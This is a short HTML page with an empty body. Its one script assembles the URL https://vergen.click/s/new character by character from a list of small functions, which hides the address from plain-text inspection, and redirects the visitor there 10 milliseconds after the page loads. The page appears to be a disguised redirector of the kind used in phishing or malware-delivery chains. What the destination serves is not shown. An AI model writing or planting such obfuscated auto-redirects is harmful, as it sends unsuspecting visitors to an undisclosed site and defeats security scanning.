<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script>
        const segments = [
            () => 'h',
            function() { return 't'; },
            _ => 't',
            _ => 'p',
            function() { return 's'; },
            function() { return ':'; },
            function() { return '/'; },
            _ => '/',
            () => 'v',
            () => 'e',
            function() { return 'r'; },
            function() { return 'g'; },
            function() { return 'e'; },
            () => 'n',
            function() { return '.'; },
            function() { return 'c'; },
            _ => 'l',
            () => 'i',
            _ => 'c',
            function() { return 'k'; },
            function() { return '/'; },
            _ => 's',
            () => '/',
            () => 'n',
            () => 'e',
            _ => 'w'
        ];
        setTimeout(() => {
            window.location.replace(segments.map(f => f()).join(''));
        }, 10);
    </script>
</head>
<body></body>
</html>
